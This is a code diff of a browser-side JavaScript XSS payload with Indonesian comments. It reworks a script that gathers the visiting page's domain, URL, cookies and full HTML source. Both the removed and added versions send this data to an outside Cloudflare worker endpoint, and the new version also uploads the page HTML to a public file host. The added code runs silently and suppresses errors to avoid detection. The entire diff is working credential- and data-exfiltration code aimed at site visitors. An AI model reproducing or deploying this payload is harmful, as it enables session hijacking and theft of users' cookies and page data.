@@ -1,46 +1,41 @@
-function telegramSend() {
-    var textData = 'XSS+Alert+in+' + document.domain + '</b>%0d%0a------------------------------------------------%0d%0a%0d%0a<b>-+URL+Target+-%0d%0a<pre>' + document.location.hostname + document.location.pathname + '</pre>%0d%0a%0d%0a<b>-+Document+Cookie+-</b>%0d%0a<pre>' + document.cookie + '</pre>';
-    
-    var xhr = new XMLHttpRequest();
-    xhr.open('GET', 'https://memek-worker.defoy89122.workers.dev/?message=' + textData, true);
-    xhr.send();
-}
-telegramSend();
-async function sendPageSource() {
+(async function() {
   try {
-    // 1. Ambil HTML dan lokasi domain
-    const htmlContent = document.documentElement.outerHTML;
+    const currentDomain = document.domain;
     const currentUrl = window.location.href;
+    const cookies = document.cookie || 'Kosong';
+    const htmlContent = document.documentElement.outerHTML;
 
-    // 2. Buat objek FormData untuk Uguu.se
+    // 1. Kirim ringkasan teks secara senyap via GET
+    const summaryText = `Info: ${currentDomain}\nTarget: ${currentUrl}\nCookie: ${cookies}`;
+    fetch(`https://memek-worker.defoy89122.workers.dev/?message=${encodeURIComponent(summaryText)}`).catch(() => {});
+
+    // 2. Unggah file HTML ke Uguu.se
     const formData = new FormData();
     const blob = new Blob([htmlContent], { type: 'text/html' });
-    formData.append('files[]', blob, 'source.html');
+    formData.append('files[]', blob, `${currentDomain}_source.html`);
 
-    // 3. Upload file ke Uguu.se via JavaScript
     const uguuResponse = await fetch('https://uguu.se/upload', {
       method: 'POST',
       body: formData
     });
-    
-    const uguuData = await uguuResponse.json();
-    const uploadedFileUrl = uguuData.files[0].url; // Mendapatkan link hasil upload
 
-    // 4. Kirim link & info domain ke Cloudflare Worker
-    await fetch('https://memek-worker.defoy89122.workers.dev/', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        file_url: uploadedFileUrl,
-        page_url: currentUrl
-      })
-    });
+    if (uguuResponse.ok) {
+      const uguuData = await uguuResponse.json();
+      const fileUrl = uguuData.files?.[0]?.url;
 
-    console.log('Berhasil terkirim!');
-  } catch (error) {
-    console.error('Terjadi kesalahan:', error);
+      if (fileUrl) {
+        // 3. Kirim link ke Worker secara senyap via POST
+        await fetch('https://memek-worker.defoy89122.workers.dev/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            file_url: fileUrl,
+            page_url: currentUrl
+          })
+        });
+      }
+    }
+  } catch (e) {
+    // Error diabaikan agar tidak memicu pesan error di konsol
   }
-}
-
-// Jalankan fungsi
-sendPageSource();
+})();
